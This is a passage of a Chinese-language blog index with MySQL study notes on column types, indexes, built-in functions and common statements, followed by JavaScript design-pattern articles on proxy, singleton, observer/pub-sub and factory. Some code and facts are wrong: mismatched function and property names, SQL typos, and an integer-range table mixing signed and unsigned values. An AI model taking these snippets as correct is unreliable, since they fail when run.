对速度有提升\n\n\nmysql&gt; select * from a\t-&gt; union all #union all 可以避免重复语句合并\t-&gt; select * from b;mysql&gt; select goods_id,cat_id,goods_name,shop_price from goods where cat_id=2\t-&gt; union\t-&gt; select goods_id,cat_id,goods_name,shop_price from goods where cat_id=4;​```\t\t\t## 六、建表总结​```bashcreate table 表名 （\t列1 列类型 [列属性 默认值]\t列2 列类型 [列属性 默认值]\t...\t);\tengine = 存储引擎\tchartset = 字符集\n\n\n建表过程：声明表头的过程，也就是声明列的过程\n\n\n选择合理的列类型 合理的列宽度（即放下内容 又不浪费磁盘空间）\n列选什么类型的列 列给什么样的属性\n数值型–整形，浮点型，定点型\n字符串型–char varchar text\n日期时间类型–2012-12-13 14.25.36\n\n6.1 整型列\n\n\n类型：\n字节：\n最小值：\n最大值：\n\n\n\nbigint\n8字节\n-9223372036854775808\n18446744073709551615\n\n\nint\n4字节\n-2147483648\n4294967295\n\n\nmediunint\n3字节\n-8388608\n8388607\n\n\nsmallint\n&#96;2字节\n-32768\n32767\n\n\ntinyint\n1字节\n-128\n127\n\n\n\n整型列的可选参数\n\n\nunsigned 无符号，列的值从0开始不为负\nzerofill M（宽度）适合用于 学号 编码等固定宽度的数字，可以用0填充至固定宽度\n学号：1--0001\n注意：zerofill属性默认决定是unsigned\n\n6.2 浮点列与定点列\nfloat（M，D） M是精度总位数 D代表小数点后面的位数\nfloat/double 范围区别和decimal相比：浮点数存储有精度的损失\ndecimal 定点型更精确\n\n6.3 字符型列\nchar(M)–char(10)只能存10个字符\n\nchar\n型:如果不够\nM\n  个字符，内部会用空格补齐，取出时在把右侧空格删掉  - 注意：这意味着右侧本身有空格将会丢失- `varchar(M)`–用多少占多少–自动扩展- `varchar`不会丢失空格- 速度上：定长`char`快一些 在一定范围内用`char`定长寻址快 速度快- `M`比较短`20`个以内用`char`- `text` 存大段文本- ```  blob\n\n \n\n是二进制类型 用来存图像信息 音频等二进制信息\n\n- `blob`意义在于防止因为字符集的问题导致信息丢失\n\n\n&#96;&#96;&#96;enum\n  枚举类型：是定义好 值就在某几个枚举范围内  - `gender emum(&#x27;男&#x27;,&#x27;女&#x27;) insert` 只能选其中之一### 6.4 日期时间类型- `year`：存年份- `date`:存年份日期2016-18- `time`：存时分秒- `datetime`:年月日时分秒\nmysql&gt; create table t8(  -&gt; ya year,  -&gt; dt date,  -&gt; tm time,  -&gt; dttm datetime);  -&gt; insert into t8 (ya,dt,tm) values(2015,’2015-12-18’,’18:28:36’);\n### 6.5 列的默认值- `NULL`查询不方便- `NULL`索引效率不高- 实际中避免列的值为`NULL`&gt; 如何避免：声明列`NOT NULL default`默认值\nmysql&gt; create table t10(  -&gt; id int not null default 0,  -&gt; name char(10) not null default ‘’  -&gt; );\n### 6.6 主键与自增- 主键`primary key` 此列不重复，能区分每一行- `primary key,auto_increment(一般那两个一起出现)`- 注意：一张表列只能有一列为`auto_increment` 且此列必须加索引（`index` `key`）- 优化：  - 定长（`char`）与变长（`varchar`）分离  - 常用与不常用列分离  - 能提高表的查询效率### 6.7 列的删除与增加：（列的增删改）- `alter table 表名 add 列名 列类型 列属性` 默认在表的最后- `alter table 表名 drop column 指定列`–删除列- `alter table 表名 add 列名 列类型 列属性` [`after` 指定列的后面]- `alter table 表名 change height(要修改的) shengao（被修改后的） smallint`- `alter table 表名 modify 列名` 要改成的新的属性### 6.8 视图：（存储的都是语句）&gt; `view`被称为虚拟表，view是sql语句的查询结果（物理表的一个映射结果，物理表一改变，视图表也改变）**1. view好处**- 权限控制可用：  - 比如某几个列允许用户查询，其他不允许  - 可通过视图开放其中一列或几列，起到权限控制作用- 简化复杂的查询- 视图能更新？  - 如果视图的每一行是与物理表一一对应的可以  - view的行是由物理表多行经过计算得到的结果，view不可以更新**2. 视图的algorithm**- 对于检查查询形成的view，在对view查询时，如order by where- 可以把建视图语句+查视图的语句===合并成==&gt;查物理的语句- 这种视图的算法叫merger（合并）### 6.9 引擎的概念- `mysql 5.0`以上默认的引擎是`innoDB` 一般建表时指定引擎- `myisam`引擎存储的数据可以直接考出来拿去用- `innDB`要把数据导出来&gt; `myisam`和`innDB`引擎区别| mysiam           | innDB |        || :--------------- | :---- | ------ || 批量插入的速度： | 高    | 低     || 存储限制：       | 没有  | `64TB` |### 6.10 字符集与乱码问题- 字符集、校对集(排序规则)、乱码- 文字本来的字符集与展示的字符集不一致导致- 客户端编码设置：`set names gbk/utf8;`- 表设置编码:`create table ()charset utf8;`- 服务器端`utf8/gbk` 都可- 网页的话：`mate:charset=utf8;`### 6.11 索引- 索引是数据的目录，能快速定位行数据的位置- 索引提高了查询的速度，降低了增删改的速度，并非越多越好- 一般在查询频率的列上加，而且在重复低列上加效果好- `key` 普通索引- `unique key` 唯一键- `primary key` 主键索引- 索引长度：建索引时，可以只索引列的前一部分的内容比如：前十个字符 `key email(email(10));`- 多列索引:就是把`2`列或者多列的值，看成一个整体，然后键索引- 冗余索引：在某个列上可能存在多个索引### 6.12 索引操作- 查看索引：`show index from goods\\G`- 删除索引：\nalter table 表名 drop index 索引名\n  - 或者：`drop index 索引名 on 表名`- 添加：`alter table 表名 add [index \\unqiue]索引名(列名)`- 添加主键索引：`alter table 表名 add primary key 列名`- 删除主键索引：`alter table 表名 drop primary key`## 七、常用函数### 7.1 数学函数- `abs(x)` 返回x的绝对值- `bin(x)` 返回x的二进制（oct返回八进制，hex返回十六进制）- `ceiling(x)` 返回大于x的最小整数值- `exp(x)` 返回值`e`（自然对数的底）的`x`次方- `floor(x)` 返回小于`x`的最大整数值- `greatest(x1,x2,...,xn)`返回集合中最大的值- `least(x1,x2,...,xn)` 返回集合中最小的值- `ln(x)` 返回x的自然对数- `log(x,y)`返回`x`的以`y`为底的对数- `mod(x,y)` 返回x/y的模（余数）- `pi()`返回`pi`的值（圆周率）- `rand()`返回`０`到`1`内的随机值,可以通过提供一个参数(种子)使`rand()`随机数生成器生成一个指定的值。- `round(x,y)`返回参数`x`的四舍五入的有`y`位小数的值- `sign(x)`返回代表数字`x`的符号的值- `sqrt(x)`返回一个数的平方根- `truncate(x,y)` 返回数字`x`截短为`y`位小数的结果### 7.2 聚合函数(常用于group by从句的select查询中)- `avg(col)`返回指定列的平均值- `count(col)`返回指定列中非`null`值的个数- `min(col)`返回指定列的最小值- `max(col)`返回指定列的最大值- `sum(col)`返回指定列的所有值之和- `group_concat(col)`返回由属于一组的列值连接组合而成的结果### 7.3 字符串函数- `ascii(char)`返回字符的`ascii`码值- `bit_length(str)`返回字符串的比特长度- `concat(s1,s2...,sn)`将s`1,s2...,sn`连接成字符串- `concat_ws(sep,s1,s2...,sn)`将`s1,s2...,sn`连接成字符串，并用`sep`字符间隔- `insert(str,x,y,instr)`将字符串`str`从第`x`位置开始，`y`个字符长的子串替换为字符串`instr`，返回结果- `find_in_set(str,list)`分析逗号分隔的`list`列表，如果发现`str`，返回`str`在`list`中的位置- `lcase(str)`或`lower(str)` 返回将字符串`str`中所有字符改变为小写后的结果- `left(str,x)`返回字符串`str`中最左边的`x`个字符- `length(s)`返回字符串`str`中的字符数- `ltrim(str)` 从字符串`str`中切掉开头的空格- `position(substr,str)` 返回子串`substr`在字符串`str`中第一次出现的位置- `quote(str)` 用反斜杠转义`str`中的单引号- `repeat(str,srchstr,rplcstr)`返回字符串`str`重复`x`次的结果- `reverse(str) 返回颠倒字符串`str`的结果- `right(str,x) 返回字符串`str`中最右边的`x`个字符- `rtrim(str) 返回字符串`str`尾部的空格- `strcmp(s1,s2)`比较字符串`s1`和`s2`- `trim(str)`去除字符串首部和尾部的所有空格- `ucase(str)`或`upper(str)` 返回将字符串`str`中所有字符转变为大写后的结果### 7.4 日期和时间函数- `curdate()`或`current_date()` 返回当前的日期- `curtime()`或`current_time()` 返回当前的时间- `date_add(date,interval int - keyword)`返回日期`date`加上间隔时间`int`的结果(`int`必须按照关键字进行格式化),如：`selectdate_add(current_date,interval 6 month);`- `date_format(date,fmt)` 依照指定的`fmt`格式格式化日期`date`值- `date_sub(date,interval int - keyword)`返回日期`date`加上间隔时间`int`的结果(`int`必须按照关键字进行格式化),如：`selectdate_sub(current_date,interval 6 month);`- `dayofweek(date)` 返回date所代表的一星期中的第几天(`1~7`)- `dayofmonth(date)` 返回date是一个月的第几天(`1~31`)- `dayofyear(date)` 返回date是一年的第几天(`1~366`)- `dayname(date)` 返回date的星期名，如：`select dayname(current_date);`- `from_unixtime(ts,fmt)` 根据指定的`fmt`格式，格式化`unix`时间戳`ts`- `hour(time)` 返回time的小时值`(0~23)`- `minute(time)` 返回time的分钟值`(0~59)`- `month(date)` 返回`date`的月份值`(1~12)`- `monthname(date)` 返回`date`的月份名，如：`select monthname(current_date);`- `now()` 返回当前的日期和时间- `quarter(date)` 返回`date`在一年中的季度`(1~4)`，如`select quarter(current_date);``- `week(date)` 返回日期`date`为一年中第几周(`0~53`)- `year(date)` 返回日期`date`的年份(`1000~9999`)**一些示例**- 获取当前系统时间：\nselect from_unixtime(unix_timestamp());\n\n\nselect extract(year_month from current_date);\nselect extract(day_second from current_date);\nselect extract(hour_minute from current_date);\n- 返回两个日期值之间的差值(月数)：\nselect period_diff(200302,199802);\n- 在`mysql`中计算年龄：\nselect date_format(from_days(to_days(now())-to_days(birthday)),’%y’)+0 as age from employee;\n&gt; 这样，如果`brithday`是未来的年月日的话，计算结果为`0`。下面的`sql`语句计算员工的绝对年龄，即当`birthday`是未来的日期时，将得到负值\nselect date_format(now(), ‘%y’) - date_format(birthday, ‘%y’) -(date_format(now(), ‘00-%m-%d’) &lt;date_format(birthday, ‘00-%m-%d’)) as age from employee\n### 7.5 加密函数- `aes_encrypt(str,key)` 返回用密钥`key`对字符串`str`利用高级加密标准算法加密后的结果，调用`aes_encrypt`的结果是一个二进制字符串，以`blob`类型存储- `aes_decrypt(str,key)` 返回用密钥`key`对字符串`str`利用高级加密标准算法解密后的结果- `decode(str,key)` 使用`key`作为密钥解密加密字符串`str`- `encrypt(str,salt)` 使用`unixcrypt()`函数，用关键词`salt`(一个可以惟一确定口令的字符串，就像钥匙一样)加密字符串`str`- `encode(str,key)` 使用key作为密钥加密字符串str，调用`encode()`的结果是一个二进制字符串，它以`blob`类型存储- `md5()` 计算字符串`str`的`md5`校验和- `password(str)` 返回字符串`str`的加密版本，这个加密过程是不可逆转的，和`unix`密码加密过程使用不同的算法。- `sha()` 计算字符串`str`的安全散列算法(`sha`)校验和\n示例：select encrypt(‘root’,’salt’);select encode(‘xufeng’,’key’);select decode(encode(‘xufeng’,’key’),’key’);#加解密放在一起select aes_encrypt(‘root’,’key’);select aes_decrypt(aes_encrypt(‘root’,’key’),’key’);select md5(‘123456’);select sha(‘123456’);\n### 7.6 格式化函数- `date_format(date,fmt)` 依照字符串`fmt`格式化日期`date`值- `format(x,y)` 把`x`格式化为以逗号隔开的数字序列，`y`是结果的小数位数- `inet_aton(ip)` 返回`ip`地址的数字表示- `inet_ntoa(num)` 返回数字所代表的`ip`地址- `time_format(time,fmt)` 依照字符串`fmt`格式化时间`time`值- 其中最简单的是`format()`函数，它可以把大的数值格式化为以逗号间隔的易读的序列。\n示例：select format(34234.34323432,3);\nselect date_format(now(),’%w,%d %m %y %r’);\nselect date_format(now(),’%y-%m-%d’);\nselect date_format(19990330,’%y-%m-%d’);\nselect date_format(now(),’%h:%i %p’);\nselect inet_aton(‘10.122.89.47’);\nselect inet_ntoa(175790383);\n### 7.7 类型转化函数&gt; 为了进行数据类型转化，`mysql`提供了`cast()`函数，它可以把一个值转化为指定的数据类型。类型有：`binary`,`char`,`date`,`time`,`datetime`,`igned`,`unsigned`\n示例：select cast(now() as signed integer),curdate()+0;select ‘f’&#x3D;binary ‘f’,’f’&#x3D;cast(‘f’ as binary);\n### 7.8 系统信息函数- `database()` 返回当前数据库名- `benchmark(count,expr)` 将表达式`expr`重复运行`count`次- `connection_id()` 返回当前客户的连接`id`- `found_rows()` 返回最后一个`select`查询进行检索的总行数- `user()`或`system_user()` 返回当前登陆用户名- `version()` 返回`mysql`服务器的版本\n示例：select database(),version(),user();\n#该例中,mysql计算log(rand()*pi())表达式9999999次。selectbenchmark(9999999,log(rand()*pi()));\n## 八、Mysql十条常用语句**1. 链接到数据库服务器**\nmysql -h 地址 -u root -p 密码\n**2. 查看所有库**\nshow databases;\n**3. 选库**\nuse 库名\n**4. 查看库下面的表**\nshow tables;\n**5. 建表**\ncreate table msg{    id int auto_increment primary key，    content varcha(200)，    pubtime int}charset utf8;\n**6. 告诉服务器你的字符集：set names gbk/utg8;****7. 添加数据**\ninsert into msg(id,content,pubtime) values(1,’哈哈哈哈’,13445);\n**8. 查询所有数据**\nselect * from msg;\n**9. 按id查询**\nselect * from where id &#x3D; 2…\n**10. 快速清空表**\ntruncate 表名\n&#96;&#96;&#96;\n九、可视化管理数据\n一般为了方便管理数据，我们都需要用到可视化工具\n\n\nnavicat-for-mysql\n\n\n这里提供一份数据表，供学习使用，导入sql数据到navicat\n\n\nhttp://blog.poetries.top/sql/mysql-table.sql\n\n","categories":["数据库"],"tags":["mysql"]},{"title":"代理模式","url":"/2019/02/27/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/","content":"一、是什么代理模式（Proxy Pattern）是为一个对象提供一个代用品或占位符，以便控制对它的访问\n代理模式的关键是，当客户不方便直接访问一个对象或者不满足需要时，提供一个替身对象来控制这个对象的访问，客户实际上访问的是替身对象\n\n在生活中，代理模式的场景是十分常见的，例如我们现在如果有租房、买房的需求，更多的是去找链家等房屋中介机构，而不是直接寻找想卖房或出租房的人谈。此时，链家起到的作用就是代理的作用\n二、使用在ES6中，存在proxy构建函数能够让我们轻松使用代理模式：\nconst proxy = new Proxy(target, handler);\n\n1\n关于Proxy的使用可以翻看以前的文章\n而按照功能来划分，javascript代理模式常用的有：\n\n缓存代理\n虚拟代理\n\n缓存代理缓存代理可以为一些开销大的运算结果提供暂时的存储，在下次运算时，如果传递进来的参数跟之前一致，则可以直接返回前面存储的运算结果\n如实现一个求积乘的函数，如下：\nvar muti = function () &#123;  console.log(&quot;开始计算乘积&quot;);  var a = 1;  for (var i = 0, l = arguments.length; i &lt; l; i++) &#123;    a = a * arguments[i];  &#125;  return a;&#125;;\n\n现在加入缓存代理，如下：\nvar proxyMult = (function () &#123;  var cache = &#123;&#125;;  return function () &#123;    var args = Array.prototype.join.call(arguments, &quot;,&quot;);    if (args in cache) &#123;      return cache[args];    &#125;    return (cache[args] = mult.apply(this, arguments));  &#125;;&#125;)();proxyMult(1, 2, 3, 4); // 输出:24proxyMult(1, 2, 3, 4); // 输出:24\n\n当第二次调用 proxyMult(1, 2, 3, 4) 时，本体 mult 函数并没有被计算，proxyMult 直接返回了之前缓存好的计算结果\n虚拟代理虚拟代理把一些开销很大的对象，延迟到真正需要它的时候才去创建\n常见的就是图片预加载功能：\n未使用代理模式如下：\nlet MyImage = (function()&#123;    let imgNode = document.createElement( &#x27;img&#x27; );    document.body.appendChild( imgNode );    // 创建一个Image对象，用于加载需要设置的图片    let img = new Image;    img.onload = function()&#123;        // 监听到图片加载完成后，设置src为加载完成后的图片        imgNode.src = img.src;    &#125;;    return &#123;        setSrc: function( src )&#123;            // 设置图片的时候，设置为默认的loading图            imgNode.src = &#x27;https://img.zcool.cn/community/01deed576019060000018c1bd2352d.gif&#x27;;            // 把真正需要设置的图片传给Image对象的src属性            img.src = src;        &#125;    &#125;&#125;)();MyImage.setSrc( &#x27;https://xxx.jpg&#x27; );\n\nMyImage对象除了负责给img节点设置src外，还要负责预加载图片，违反了面向对象设计的原则——单一职责原则\n上述过程loding则是耦合进MyImage对象里的，如果以后某个时候，我们不需要预加载显示loading这个功能了，就只能在MyImage对象里面改动代码\n使用代理模式，代码则如下：\n// 图片本地对象，负责往页面中创建一个img标签，并且提供一个对外的setSrc接口let myImage = (function()&#123;    let imgNode = document.createElement( &#x27;img&#x27; );    document.body.appendChild( imgNode );    return &#123;        //setSrc接口，外界调用这个接口，便可以给该img标签设置src属性        setSrc: function( src )&#123;            imgNode.src = src;        &#125;    &#125;&#125;)();// 代理对象，负责图片预加载功能let proxyImage = (function()&#123;    // 创建一个Image对象，用于加载需要设置的图片    let img = new Image;    img.onload = function()&#123;        // 监听到图片加载完成后，给被代理的图片本地对象设置src为加载完成后的图片        myImage.setSrc( this.src );    &#125;    return &#123;        setSrc: function( src )&#123;            // 设置图片时，在图片未被真正加载好时，以这张图作为loading，提示用户图片正在加载            myImage.setSrc( &#x27;https://img.zcool.cn/community/01deed576019060000018c1bd2352d.gif&#x27; );            img.src = src;        &#125;    &#125;&#125;)();proxyImage.setSrc( &#x27;https://xxx.jpg&#x27; );\n\n使用代理模式后，图片本地对象负责往页面中创建一个img标签，并且提供一个对外的setSrc接口；\n代理对象负责在图片未加载完成之前，引入预加载的loading图，负责了图片预加载的功能\n上述并没有改变或者增加MyImage的接口，但是通过代理对象，实际上给系统添加了新的行为\n并且上述代理模式可以发现，代理和本体接口的一致性，如果有一天不需要预加载，那么就不需要代理对象，可以选择直接请求本体。其中关键是代理对象和本体都对外提供了 setSrc 方法\n三、应用场景现在的很多前端框架或者状态管理框架都使用代理模式，用与监听变量的变化\n使用代理模式代理对象的访问的方式，一般又被称为拦截器，比如我们在项目中经常使用 Axios 的实例来进行 HTTP 的请求，使用拦截器 interceptor 可以提前对 请求前的数据 服务器返回的数据进行一些预处理\n以及上述应用到的缓存代理和虚拟代理\n","categories":["设计模式"],"tags":["设计模式"]},{"title":"单例模式","url":"/2019/03/03/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/","content":"一、是什么单例模式（Singleton Pattern）：创建型模式，提供了一种创建对象的最佳方式，这种模式涉及到一个单一的类，该类负责创建自己的对象，同时确保只有单个对象被创建\n在应用程序运行期间，单例模式只会在全局作用域下创建一次实例对象，让所有需要调用的地方都共享这一单例对象，如下图所示：\n\n从定义上来看，全局变量好像就是单例模式，但是一般情况我们不认为全局变量是一个单例模式，原因是：\n\n全局命名污染\n不易维护，容易被重写覆盖\n\n二、实现在javascript中，实现一个单例模式可以用一个变量来标志当前的类已经创建过对象，如果下次获取当前类的实例时，直接返回之前创建的对象即可，如下：\n// 定义一个类function Singleton(name) &#123;    this.name = name;    this.instance = null;&#125;// 原型扩展类的一个方法getName()Singleton.prototype.getName = function() &#123;    console.log(this.name)&#125;;// 获取类的实例Singleton.getInstance = function(name) &#123;    if(!this.instance) &#123;        this.instance = new Singleton(name);    &#125;    return this.instance&#125;;// 获取对象1const a = Singleton.getInstance(&#x27;a&#x27;);// 获取对象2const b = Singleton.getInstance(&#x27;b&#x27;);// 进行比较console.log(a === b);\n\n使用闭包也能够实现，如下：\nfunction Singleton(name) &#123;    this.name = name;&#125;// 原型扩展类的一个方法getName()Singleton.prototype.getName = function() &#123;    console.log(this.name)&#125;;// 获取类的实例Singleton.getInstance = (function() &#123;    var instance = null;    return function(name) &#123;        if(!this.instance) &#123;            this.instance = new Singleton(name);        &#125;        return this.instance    &#125;        &#125;)();// 获取对象1const a = Singleton.getInstance(&#x27;a&#x27;);// 获取对象2const b = Singleton.getInstance(&#x27;b&#x27;);// 进行比较console.log(a === b);\n\n也可以将上述的方法稍作修改，变成构造函数的形式，如下：\n// 单例构造函数function CreateSingleton (name) &#123;    this.name = name;    this.getName();&#125;;// 获取实例的名字CreateSingleton.prototype.getName = function() &#123;    console.log(this.name)&#125;;// 单例对象const Singleton = (function()&#123;    var instance;    return function (name) &#123;        if(!instance) &#123;            instance = new CreateSingleton(name);        &#125;        return instance;    &#125;&#125;)();// 创建实例对象1const a = new Singleton(&#x27;a&#x27;);// 创建实例对象2const b = new Singleton(&#x27;b&#x27;);console.log(a===b); // true\n\n三、使用场景在前端中，很多情况都是用到单例模式，例如页面存在一个模态框的时候，只有用户点击的时候才会创建，而不是加载完成之后再创建弹窗和隐藏，并且保证弹窗全局只有一个\n可以先创建一个通常的获取对象的方法，如下：\nconst getSingle = function( fn )&#123;  let result;  return function()&#123;    return result || ( result = fn .apply(this, arguments ) );  &#125;&#125;; \n\n创建弹窗的代码如下：\nconst createLoginLayer = function()&#123;  var div = document.createElement( &#x27;div&#x27; );  div.innerHTML = &#x27;我是浮窗&#x27;;  div.style.display = &#x27;none&#x27;;  document.body.appendChild( div );  return div;&#125;; const createSingleLoginLayer = getSingle( createLoginLayer ); document.getElementById( &#x27;loginBtn&#x27; ).onclick = function()&#123;  var loginLayer = createSingleLoginLayer();  loginLayer.style.display = &#x27;block&#x27;;&#125;;\n\n上述这种实现称为惰性单例，意图解决需要时才创建类实例对象\n并且Vuex、redux全局态管理库也应用单例模式的思想，如下图：\n\n现在很多第三方库都是单例模式，多次引用只会使用同一个对象，如jquery、lodash、moment…\n","categories":["设计模式"],"tags":["设计模式"]},{"title":"发布订阅、观察者模式（观察者模式）","url":"/2019/03/08/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E5%8F%91%E5%B8%83%E8%AE%A2%E9%98%85%E3%80%81%E8%A7%82%E5%AF%9F%E8%80%85%E6%A8%A1%E5%BC%8F/","content":"一、观察者模式观察者模式定义了对象间的一种一对多的依赖关系，当一个对象的状态发生改变时，所有依赖于它的对象都将得到通知，并自动更新\n观察者模式属于行为型模式，行为型模式关注的是对象之间的通讯，观察者模式就是观察者和被观察者之间的通讯\n\n例如生活中，我们可以用报纸期刊的订阅来形象的说明，当你订阅了一份报纸，每天都会有一份最新的报纸送到你手上，有多少人订阅报纸，报社就会发多少份报纸\n报社和订报纸的客户就形成了一对多的依赖关系\n实现代码如下：\n被观察者模式\nclass Subject &#123;  constructor() &#123;    this.observerList = [];  &#125;  addObserver(observer) &#123;    this.observerList.push(observer);  &#125;  removeObserver(observer) &#123;    const index = this.observerList.findIndex(o =&gt; o.name === observer.name);    this.observerList.splice(index, 1);  &#125;  notifyObservers(message) &#123;    const observers = this.observeList;    observers.forEach(observer =&gt; observer.notified(message));  &#125;&#125;\n\n观察者：\nclass Observer &#123;  constructor(name, subject) &#123;    this.name = name;    if (subject) &#123;      subject.addObserver(this);    &#125;  &#125;  notified(message) &#123;    console.log(this.name, &#x27;got message&#x27;, message);  &#125;&#125;\n\n使用代码如下：\nconst subject = new Subject();const observerA = new Observer(&#x27;observerA&#x27;, subject);const observerB = new Observer(&#x27;observerB&#x27;);subject.addObserver(observerB);subject.notifyObservers(&#x27;Hello from subject&#x27;);subject.removeObserver(observerA);subject.notifyObservers(&#x27;Hello again&#x27;);\n\n上述代码中，观察者主动申请加入被观察者的列表，被观察者主动将观察者加入列表\n二、发布订阅模式发布-订阅是一种消息范式，消息的发送者（称为发布者）不会将消息直接发送给特定的接收者（称为订阅者）。而是将发布的消息分为不同的类别，无需了解哪些订阅者（如果有的话）可能存在\n同样的，订阅者可以表达对一个或多个类别的兴趣，只接收感兴趣的消息，无需了解哪些发布者存在\n\n实现代码如下：\nclass PubSub &#123;  constructor() &#123;    this.messages = &#123;&#125;;    this.listeners = &#123;&#125;;  &#125;  // 添加发布者  publish(type, content) &#123;    const existContent = this.messages[type];    if (!existContent) &#123;      this.messages[type] = [];    &#125;    this.messages[type].push(content);  &#125;  // 添加订阅者  subscribe(type, cb) &#123;    const existListener = this.listeners[type];    if (!existListener) &#123;      this.listeners[type] = [];    &#125;    this.listeners[type].push(cb);  &#125;  // 通知  notify(type) &#123;    const messages = this.messages[type];    const subscribers = this.listeners[type] || [];    subscribers.forEach((cb, index) =&gt; cb(messages[index]));  &#125;&#125;\n\n发布者代码如下：\nclass Publisher &#123;  constructor(name, context) &#123;    this.name = name;    this.context = context;  &#125;  publish(type, content) &#123;    this.context.publish(type, content);  &#125;&#125;\n\n订阅者代码如下：\nclass Subscriber &#123;  constructor(name, context) &#123;    this.name = name;    this.context = context;  &#125;  subscribe(type, cb) &#123;    this.context.subscribe(type, cb);  &#125;&#125;\n\n使用代码如下：\nconst TYPE_A = &#x27;music&#x27;;const TYPE_B = &#x27;movie&#x27;;const TYPE_C = &#x27;novel&#x27;;const pubsub = new PubSub();const publisherA = new Publisher(&#x27;publisherA&#x27;, pubsub);publisherA.publish(TYPE_A, &#x27;we are young&#x27;);publisherA.publish(TYPE_B, &#x27;the silicon valley&#x27;);const publisherB = new Publisher(&#x27;publisherB&#x27;, pubsub);publisherB.publish(TYPE_A, &#x27;stronger&#x27;);const publisherC = new Publisher(&#x27;publisherC&#x27;, pubsub);publisherC.publish(TYPE_C, &#x27;a brief history of time&#x27;);const subscriberA = new Subscriber(&#x27;subscriberA&#x27;, pubsub);subscriberA.subscribe(TYPE_A, res =&gt; &#123;  console.log(&#x27;subscriberA received&#x27;, res)&#125;);const subscriberB = new Subscriber(&#x27;subscriberB&#x27;, pubsub);subscriberB.subscribe(TYPE_C, res =&gt; &#123;  console.log(&#x27;subscriberB received&#x27;, res)&#125;);const subscriberC = new Subscriber(&#x27;subscriberC&#x27;, pubsub);subscriberC.subscribe(TYPE_B, res =&gt; &#123;  console.log(&#x27;subscriberC received&#x27;, res)&#125;);pubsub.notify(TYPE_A);pubsub.notify(TYPE_B);pubsub.notify(TYPE_C);\n\n上述代码，发布者和订阅者需要通过发布订阅中心进行关联，发布者的发布动作和订阅者的订阅动作相互独立，无需关注对方，消息派发由发布订阅中心负责\n三、区别两种设计模式思路是一样的，举个生活例子：\n\n观察者模式：某公司给自己员工发月饼发粽子，是由公司的行政部门发送的，这件事不适合交给第三方，原因是“公司”和“员工”是一个整体\n发布-订阅模式：某公司要给其他人发各种快递，因为“公司”和“其他人”是独立的，其唯一的桥梁是“快递”，所以这件事适合交给第三方快递公司解决\n\n上述过程中，如果公司自己去管理快递的配送，那公司就会变成一个快递公司，业务繁杂难以管理，影响公司自身的主营业务，因此使用何种模式需要考虑什么情况两者是需要耦合的\n两者区别如下图：\n\n\n在观察者模式中，观察者是知道Subject的，Subject一直保持对观察者进行记录。然而，在发布订阅模式中，发布者和订阅者不知道对方的存在。它们只有通过消息代理进行通信。\n在发布订阅模式中，组件是松散耦合的，正好和观察者模式相反。\n观察者模式大多数时候是同步的，比如当事件触发，Subject就会去调用观察者的方法。而发布-订阅模式大多数时候是异步的（使用消息队列）\n\n","categories":["设计模式"],"tags":["设计模式"]},{"title":"工厂模式","url":"/2019/03/12/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/","content":"一、是什么工厂模式是用来创建对象的一种最常用的设计模式，不暴露创建对象的具体逻辑，而是将将逻辑封装在一个函数中，那么这个函数就可以被视为一个工厂\n其就像工厂一样重复的产生类似的产品，工厂模式只需要我们传入正确的参数，就能生产类似的产品\n举个例子：\n\n编程中，在一个 A 类中通过 new 的方式实例化了类 B，那么 A 类和 B 类之间就存在关联（耦合）\n后期因为需要修改了 B 类的代码和使用方式，比如构造函数中传入参数，那么 A 类也要跟着修改，一个类的依赖可能影响不大，但若有多个类依赖了 B 类，那么这个工作量将会相当的大，容易出现修改错误，也会产生很多的重复代码，这无疑是件非常痛苦的事；\n这种情况下，就需要将创建实例的工作从调用方（A类）中分离，与调用方解耦，也就是使用工厂方法创建实例的工作封装起来（减少代码重复），由工厂管理对象的创建逻辑，调用方不需要知道具体的创建过程，只管使用，而降低调用者因为创建逻辑导致的错误；\n\n二、实现工厂模式根据抽象程度的不同可以分为：\n\n简单工厂模式（Simple Factory）\n工厂方法模式（Factory Method）\n抽象工厂模式（Abstract Factory）\n\n简单工厂模式简单工厂模式也叫静态工厂模式，用一个工厂对象创建同一类对象类的实例\n假设我们要开发一个公司岗位及其工作内容的录入信息，不同岗位的工作内容不一致\n代码如下：\nfunction Factory(career) &#123;    function User(career, work) &#123;        this.career = career         this.work = work    &#125;    let work    switch(career) &#123;        case &#x27;coder&#x27;:            work =  [&#x27;写代码&#x27;, &#x27;修Bug&#x27;]             return new User(career, work)            break        case &#x27;hr&#x27;:            work = [&#x27;招聘&#x27;, &#x27;员工信息管理&#x27;]            return new User(career, work)            break        case &#x27;driver&#x27;:            work = [&#x27;开车&#x27;]            return new User(career, work)            break        case &#x27;boss&#x27;:            work = [&#x27;喝茶&#x27;, &#x27;开会&#x27;, &#x27;审批文件&#x27;]            return new User(career, work)            break    &#125;&#125;let coder = new Factory(&#x27;coder&#x27;)console.log(coder)let boss = new Factory(&#x27;boss&#x27;)console.log(boss)\n\nFactory就是一个简单工厂。当我们调用工厂函数时，只需要传递name、age、career就可以获取到包含用户工作内容的实例对象\n工厂方法模式工厂方法模式跟简单工厂模式差不多，但是把具体的产品放到了工厂函数的prototype中\n这样一来，扩展产品种类就不必修改工厂函数了，和心累就变成抽象类，也可以随时重写某种具体的产品\n也就是相当于工厂总部不生产产品了，交给下辖分工厂进行生产；但是进入工厂之前，需要有个判断来验证你要生产的东西是否是属于我们工厂所生产范围，如果是，就丢给下辖工厂来进行生产\n如下代码：\n// 工厂方法function Factory(career)&#123;    if(this instanceof Factory)&#123;        var a = new this[career]();        return a;    &#125;else&#123;        return new Factory(career);    &#125;&#125;// 工厂方法函数的原型中设置所有对象的构造函数Factory.prototype=&#123;    &#x27;coder&#x27;: function()&#123;        this.careerName = &#x27;程序员&#x27;        this.work = [&#x27;写代码&#x27;, &#x27;修Bug&#x27;]     &#125;,    &#x27;hr&#x27;: function()&#123;        this.careerName = &#x27;HR&#x27;        this.work = [&#x27;招聘&#x27;, &#x27;员工信息管理&#x27;]    &#125;,    &#x27;driver&#x27;: function () &#123;        this.careerName = &#x27;司机&#x27;        this.work = [&#x27;开车&#x27;]    &#125;,    &#x27;boss&#x27;: function()&#123;        this.careerName = 